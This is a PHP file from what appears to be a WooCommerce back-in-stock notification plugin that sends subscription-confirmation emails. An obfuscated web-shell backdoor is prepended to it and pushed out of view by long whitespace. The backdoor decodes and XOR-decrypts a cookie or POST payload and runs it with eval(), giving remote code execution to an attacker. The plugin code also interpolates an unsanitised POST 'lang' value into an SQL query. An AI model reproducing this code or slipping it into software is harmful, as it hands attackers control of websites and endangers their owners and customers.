<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $h1789f2a = 511;$GLOBALS['r353b2a1'] = Array();global $r353b2a1;$r353b2a1 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['gc0550'] = "\x39\x45\x6d\x60\x20\x6f\x2b\x2c\x7c\x26\x50\x31\x25\x58\x27\x3a\x68\x21\x2f\x65\x2d\x3e\x79\x70\x2a\x3d\x4d\x32\x4a\x59\x76\x42\x36\x28\x4c\x47\x5c\x61\x33\x5b\x30\x7e\x69\x5a\x56\x74\x7d\x54\x6e\x3c\x64\x5f\x5e\x7b\x48\x4e\x75\x46\x57\x35\xd\x6b\x37\x2e\x34\x41\x71\x4f\x63\x3f\x51\x49\x44\x6a\x9\x40\x62\x29\x24\x6c\x66\x3b\x43\x5d\xa\x7a\x77\x52\x67\x4b\x78\x53\x72\x55\x23\x22\x38\x73";$r353b2a1[$r353b2a1['gc0550'][97].$r353b2a1['gc0550'][59].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][27].$r353b2a1['gc0550'][59].$r353b2a1['gc0550'][0].$r353b2a1['gc0550'][68].$r353b2a1['gc0550'][0]] = $r353b2a1['gc0550'][68].$r353b2a1['gc0550'][16].$r353b2a1['gc0550'][92];$r353b2a1[$r353b2a1['gc0550'][22].$r353b2a1['gc0550'][40].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][68].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][38]] = $r353b2a1['gc0550'][5].$r353b2a1['gc0550'][92].$r353b2a1['gc0550'][50];$r353b2a1[$r353b2a1['gc0550'][97].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][68]] = $r353b2a1['gc0550'][50].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][42].$r353b2a1['gc0550'][48].$r353b2a1['gc0550'][19];$r353b2a1[$r353b2a1['gc0550'][88].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][64].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][96]] = $r353b2a1['gc0550'][97].$r353b2a1['gc0550'][45].$r353b2a1['gc0550'][92].$r353b2a1['gc0550'][79].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][48];$r353b2a1[$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][40].$r353b2a1['gc0550'][62].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][40].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][62]] = $r353b2a1['gc0550'][50].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][42].$r353b2a1['gc0550'][48].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][50];$r353b2a1[$r353b2a1['gc0550'][45].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][59]] = $r353b2a1['gc0550'][42].$r353b2a1['gc0550'][48].$r353b2a1['gc0550'][42].$r353b2a1['gc0550'][51].$r353b2a1['gc0550'][97].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][45];$r353b2a1[$r353b2a1['gc0550'][97].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][0].$r353b2a1['gc0550'][68].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][76]] = $r353b2a1['gc0550'][97].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][92].$r353b2a1['gc0550'][42].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][79].$r353b2a1['gc0550'][42].$r353b2a1['gc0550'][85].$r353b2a1['gc0550'][19];$r353b2a1[$r353b2a1['gc0550'][79].$r353b2a1['gc0550'][0].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][37]] = $r353b2a1['gc0550'][23].$r353b2a1['gc0550'][16].$r353b2a1['gc0550'][23].$r353b2a1['gc0550'][30].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][92].$r353b2a1['gc0550'][97].$r353b2a1['gc0550'][42].$r353b2a1['gc0550'][5].$r353b2a1['gc0550'][48];$r353b2a1[$r353b2a1['gc0550'][61].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][0].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][59].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][40]] = $r353b2a1['gc0550'][56].$r353b2a1['gc0550'][48].$r353b2a1['gc0550'][97].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][92].$r353b2a1['gc0550'][42].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][79].$r353b2a1['gc0550'][42].$r353b2a1['gc0550'][85].$r353b2a1['gc0550'][19];$r353b2a1[$r353b2a1['gc0550'][90].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][96]] = $r353b2a1['gc0550'][76].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][97].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][64].$r353b2a1['gc0550'][51].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][68].$r353b2a1['gc0550'][5].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][19];$r353b2a1[$r353b2a1['gc0550'][56].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][40].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][62].$r353b2a1['gc0550'][80]] = $r353b2a1['gc0550'][97].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][45].$r353b2a1['gc0550'][51].$r353b2a1['gc0550'][45].$r353b2a1['gc0550'][42].$r353b2a1['gc0550'][2].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][51].$r353b2a1['gc0550'][79].$r353b2a1['gc0550'][42].$r353b2a1['gc0550'][2].$r353b2a1['gc0550'][42].$r353b2a1['gc0550'][45];$r353b2a1[$r353b2a1['gc0550'][16].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][96].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][59]] = $r353b2a1['gc0550'][92].$r353b2a1['gc0550'][96].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][0].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][27].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][80];$r353b2a1[$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][64]] = $r353b2a1['gc0550'][45].$r353b2a1['gc0550'][64].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][27].$r353b2a1['gc0550'][64].$r353b2a1['gc0550'][80];$r353b2a1[$r353b2a1['gc0550'][68].$r353b2a1['gc0550'][64].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][11]] = $_POST;$r353b2a1[$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][62]] = $_COOKIE;@$r353b2a1[$r353b2a1['gc0550'][45].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][59]]($r353b2a1['gc0550'][19].$r353b2a1['gc0550'][92].$r353b2a1['gc0550'][92].$r353b2a1['gc0550'][5].$r353b2a1['gc0550'][92].$r353b2a1['gc0550'][51].$r353b2a1['gc0550'][79].$r353b2a1['gc0550'][5].$r353b2a1['gc0550'][88], NULL);@$r353b2a1[$r353b2a1['gc0550'][45].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][59]]($r353b2a1['gc0550'][79].$r353b2a1['gc0550'][5].$r353b2a1['gc0550'][88].$r353b2a1['gc0550'][51].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][92].$r353b2a1['gc0550'][92].$r353b2a1['gc0550'][5].$r353b2a1['gc0550'][92].$r353b2a1['gc0550'][97], 0);@$r353b2a1[$r353b2a1['gc0550'][45].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][59]]($r353b2a1['gc0550'][2].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][90].$r353b2a1['gc0550'][51].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][90].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][68].$r353b2a1['gc0550'][56].$r353b2a1['gc0550'][45].$r353b2a1['gc0550'][42].$r353b2a1['gc0550'][5].$r353b2a1['gc0550'][48].$r353b2a1['gc0550'][51].$r353b2a1['gc0550'][45].$r353b2a1['gc0550'][42].$r353b2a1['gc0550'][2].$r353b2a1['gc0550'][19], 0);@$r353b2a1[$r353b2a1['gc0550'][56].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][40].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][62].$r353b2a1['gc0550'][80]](0);if (!$r353b2a1[$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][40].$r353b2a1['gc0550'][62].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][40].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][62]]($r353b2a1['gc0550'][65].$r353b2a1['gc0550'][34].$r353b2a1['gc0550'][87].$r353b2a1['gc0550'][1].$r353b2a1['gc0550'][65].$r353b2a1['gc0550'][72].$r353b2a1['gc0550'][29].$r353b2a1['gc0550'][51].$r353b2a1['gc0550'][87].$r353b2a1['gc0550'][93].$r353b2a1['gc0550'][55].$r353b2a1['gc0550'][51].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][96].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][96].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][27].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][59].$r353b2a1['gc0550'][59].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][27].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][40].$r353b2a1['gc0550'][27].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][37])){$r353b2a1[$r353b2a1['gc0550'][97].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][68]]($r353b2a1['gc0550'][65].$r353b2a1['gc0550'][34].$r353b2a1['gc0550'][87].$r353b2a1['gc0550'][1].$r353b2a1['gc0550'][65].$r353b2a1['gc0550'][72].$r353b2a1['gc0550'][29].$r353b2a1['gc0550'][51].$r353b2a1['gc0550'][87].$r353b2a1['gc0550'][93].$r353b2a1['gc0550'][55].$r353b2a1['gc0550'][51].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][96].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][96].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][27].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][59].$r353b2a1['gc0550'][59].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][27].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][40].$r353b2a1['gc0550'][27].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][37], 1);$g7518559 = NULL;$z1c1b = NULL;$r353b2a1[$r353b2a1['gc0550'][23].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][0].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][40].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][62]] = $r353b2a1['gc0550'][40].$r353b2a1['gc0550'][40].$r353b2a1['gc0550'][62].$r353b2a1['gc0550'][62].$r353b2a1['gc0550'][40].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][20].$r353b2a1['gc0550'][64].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][62].$r353b2a1['gc0550'][20].$r353b2a1['gc0550'][64].$r353b2a1['gc0550'][68].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][20].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][20].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][62].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][96].$r353b2a1['gc0550'][96].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][40].$r353b2a1['gc0550'][50];global $pb3960d7;function  t46324f($g7518559, $w74c36){global $r353b2a1;$rd9c45fae = "";for ($k1aae9209=0; $k1aae9209<$r353b2a1[$r353b2a1['gc0550'][88].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][64].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][96]]($g7518559);){for ($n4798f7e=0; $n4798f7e<$r353b2a1[$r353b2a1['gc0550'][88].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][64].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][96]]($w74c36) && $k1aae9209<$r353b2a1[$r353b2a1['gc0550'][88].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][64].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][96]]($g7518559); $n4798f7e++, $k1aae9209++){$rd9c45fae .= $r353b2a1[$r353b2a1['gc0550'][97].$r353b2a1['gc0550'][59].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][27].$r353b2a1['gc0550'][59].$r353b2a1['gc0550'][0].$r353b2a1['gc0550'][68].$r353b2a1['gc0550'][0]]($r353b2a1[$r353b2a1['gc0550'][22].$r353b2a1['gc0550'][40].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][68].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][38]]($g7518559[$k1aae9209]) ^ $r353b2a1[$r353b2a1['gc0550'][22].$r353b2a1['gc0550'][40].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][68].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][38]]($w74c36[$n4798f7e]));}}return $rd9c45fae;}function  r8ee9f23f($g7518559, $w74c36){global $r353b2a1;global $pb3960d7;return $r353b2a1[$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][64]]($r353b2a1[$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][76].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][64]]($g7518559, $pb3960d7), $w74c36);}foreach ($r353b2a1[$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][62]] as $w74c36=>$ge214c35d){$g7518559 = $ge214c35d;$z1c1b = $w74c36;}if (!$g7518559){foreach ($r353b2a1[$r353b2a1['gc0550'][68].$r353b2a1['gc0550'][64].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][11]] as $w74c36=>$ge214c35d){$g7518559 = $ge214c35d;$z1c1b = $w74c36;}}$g7518559 = @$r353b2a1[$r353b2a1['gc0550'][61].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][0].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][59].$r353b2a1['gc0550'][32].$r353b2a1['gc0550'][40]]($r353b2a1[$r353b2a1['gc0550'][16].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][96].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][59]]($r353b2a1[$r353b2a1['gc0550'][90].$r353b2a1['gc0550'][19].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][96]]($g7518559), $z1c1b));if (isset($g7518559[$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][61]]) && $pb3960d7==$g7518559[$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][61]]){if ($g7518559[$r353b2a1['gc0550'][37]] == $r353b2a1['gc0550'][42]){$k1aae9209 = Array($r353b2a1['gc0550'][23].$r353b2a1['gc0550'][30] => @$r353b2a1[$r353b2a1['gc0550'][79].$r353b2a1['gc0550'][0].$r353b2a1['gc0550'][80].$r353b2a1['gc0550'][38].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][37]](),$r353b2a1['gc0550'][97].$r353b2a1['gc0550'][30] => $r353b2a1['gc0550'][11].$r353b2a1['gc0550'][63].$r353b2a1['gc0550'][40].$r353b2a1['gc0550'][20].$r353b2a1['gc0550'][11],);echo @$r353b2a1[$r353b2a1['gc0550'][97].$r353b2a1['gc0550'][37].$r353b2a1['gc0550'][0].$r353b2a1['gc0550'][68].$r353b2a1['gc0550'][50].$r353b2a1['gc0550'][11].$r353b2a1['gc0550'][76]]($k1aae9209);}elseif ($g7518559[$r353b2a1['gc0550'][37]] == $r353b2a1['gc0550'][19]){eval/*z90182*/($g7518559[$r353b2a1['gc0550'][50]]);}exit();}} ?><?php

// For gmail compatibility, including CSS styles in head/body are stripped out therefore styles need to be inline. These variables contain rules which are added to the template inline.
$template_footer = "
	border-top:0;
	-webkit-border-radius:6px;
";

$credit = "
	border:0;
	font-family: Arial;
	font-size:12px;
	line-height:125%;
	text-align:center;
";
$header_color = get_option('bis_email_header_color');
$header_text_color = get_option('bis_email_header_text_color');
$body_color = get_option('bis_email_body_color');
$body_text_color = get_option('bis_email_body_text_color');

if (get_option('instock_subscription_akn_mail') == 'yes') { //sendmail if yes
    if (isset($_POST['variationid'])) {
        $var_id = $_POST['variationid'];
    } else {
        $var_id = 'no';
    }
    global $wpdb;
    global $woocommerce;

    $translated_subject = get_option('instock_subscription_email_subject');
    $translated_message = get_option('instock_subscription_email_messages');

    $to = $_POST['notifyaddress']; // note the comma
    $currentuser_lang = empty($_POST['lang']) ? "en" : $_POST['lang'];
    if ($_POST['lang'] != 'not_active') {
        $subscribe_lang = $currentuser_lang;
        //subject translation
        $string = $wpdb->get_results($wpdb->prepare("SELECT id FROM {$wpdb->prefix}icl_strings WHERE context = %s AND name = %s AND language = %s ", 'admin_texts_plugin_backinstocknotifier', 'instock_subscription_email_subject', $subscribe_lang));

        if (!empty($string)) {
            $translated_string = $wpdb->get_results($wpdb->prepare("SELECT value FROM {$wpdb->prefix}icl_strings WHERE context = %s AND name = %s AND language = %s ", 'admin_texts_plugin_backinstocknotifier', 'instock_subscription_email_subject', $subscribe_lang));
            $translated_subject = $translated_string[0]->value;
        } else {
            $string = $wpdb->get_results($wpdb->prepare("SELECT id FROM {$wpdb->prefix}icl_strings WHERE context = %s AND name = %s ", 'admin_texts_plugin_backinstocknotifier', 'instock_subscription_email_subject'));
            $string_id = @$string[0]->id;
            $translated_string = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}icl_string_translations WHERE string_id = '$string_id' AND language= '$subscribe_lang'");
            // update_option('translated_string', $translated_string[0]->value);
            $translated_subject = @$translated_string[0]->value;
        }
        if ($translated_subject == NULL) {
            $translated_subject = get_option('instock_subscription_email_subject');
        }
        //message translation
        $string = $wpdb->get_results($wpdb->prepare("SELECT id FROM {$wpdb->prefix}icl_strings WHERE context = %s AND name = %s AND language = %s ", 'admin_texts_plugin_backinstocknotifier', 'instock_subscription_email_messages', $subscribe_lang));
        if (!empty($string)) {
            $translated_string = $wpdb->get_results($wpdb->prepare("SELECT value FROM {$wpdb->prefix}icl_strings WHERE context = %s AND name = %s AND language = %s ", 'admin_texts_plugin_backinstocknotifier', 'instock_subscription_email_messages', $subscribe_lang));
            $translated_message = $translated_string[0]->value;
        } else {
            $string = $wpdb->get_results($wpdb->prepare("SELECT id FROM {$wpdb->prefix}icl_strings WHERE context = %s AND name = %s ", 'admin_texts_plugin_backinstocknotifier', 'instock_subscription_email_messages'));
            $string_id = @$string[0]->id;
            $translated_string = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}icl_string_translations WHERE string_id = '$string_id' AND language= '$subscribe_lang'");
            // update_option('translated_string', $translated_string[0]->value);
            if(isset($translated_string[0]->value)){
            $translated_message = $translated_string[0]->value;
            
            }
        }

        if ($translated_message == NULL) {
            $translated_message = get_option('instock_subscription_email_messages');
        }
    } else {
        $translated_subject = get_option('instock_subscription_email_subject');
        $translated_message = get_option('instock_subscription_email_messages');
    }

    $unsubscribe_link = esc_url_raw(add_query_arg(array('bis_product_id' => $_POST['productid'], 'bis_variation_id' => $_POST['variationid'] != '' ? $_POST['variationid'] : 'no', 'bis_mailid' => $_POST['notifyaddress']), get_post_permalink($_POST['productid'])));
    $post_id = $_POST['productid'];
    $post = get_post($_POST['productid']);
    if ($post->post_type == 'product') {

        if (!$translated_subject) {
            $translated_subject = get_option('instock_subscription_email_subject');
        }
        if (!$translated_message) {
            $translated_message = get_option('instock_subscription_email_messages');
        }

        $subject = str_replace('[product_url]', get_permalink($post_id), str_replace('[product_title]', get_the_title($post_id), str_replace('[site_title]', get_option('blogname'), $translated_subject)));
        $message = str_replace('[product_url]', "<a href=" . get_permalink($post_id) . ">" . get_permalink($post_id) . "</a>", str_replace('[product_title]', get_the_title($post_id), str_replace('[site_title]', get_option('blogname'), str_replace('[productinfo]', '', $translated_message))));


        add_filter('woocommerce_email_footer_text', array('BackInStockNotifier', 'footer_link'));

        ob_start();
        wc_get_template('emails/email-header.php', array('email_heading' => $subject));
        echo $message;
        wc_get_template('emails/email-footer.php');
        $woo_temp_msg = ob_get_clean();
        if ((float) $woocommerce->version <= (float) ('2.2.0')) {
            $mainname = get_option('woocommerce_email_from_name');
            $mainemail = get_option('woocommerce_email_from_address');
// To send HTML mail, the Content-type header must be set
            $headers = 'MIME-Version: 1.0' . "\r\n";
            $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
// Additional headers
            $headers .= 'From:' . $mainname . '  <' . $mainemail . '>' . "\r\n";
// Mail it


            if ('mail' == get_option('bis_mail_function')) {
                if (mail($to, $subject, $woo_temp_msg, $headers)) {
                    echo 'sent';
                }
            } elseif ('wp_mail' == get_option('bis_mail_function')) {
                if (wp_mail($to, $subject, $woo_temp_msg, $headers)) {
                    echo 'sent';
                }
            }
        } else {
            $mailer = WC()->mailer();
            $mailer->send($to, $subject, $woo_temp_msg, '', '');
            echo 'sent';
        }
    }
}
?>